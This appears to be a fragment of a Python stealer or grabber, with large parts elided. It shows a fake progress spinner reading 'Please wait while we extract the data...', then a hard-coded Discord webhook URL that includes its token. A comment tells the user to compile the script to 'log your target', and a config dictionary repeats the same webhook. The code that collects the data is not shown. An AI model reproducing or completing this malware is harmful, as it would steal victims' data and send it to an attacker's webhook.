...
def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write('\r' + Fore.GREEN +'Please wait while we extract the data...'+i)
		sys.stdout.flush()
		time.sleep(0.2)

Spinner()
webhook = "https://discord.com/api/webhooks/1001441184591400970/xjDW7pdi5o3n8F5K5Ttqlzq13FSPJ0eV3775iskJ9orTvce4W6h492rdaf8D1ePovJQQ" # Webhook here and make sure to compile if you wanna log your target
...
__config__ = {
    ...
    'webhook': "https://discord.com/api/webhooks/1001441184591400970/xjDW7pdi5o3n8F5K5Ttqlzq13FSPJ0eV3775iskJ9orTvce4W6h492rdaf8D1ePovJQQ",
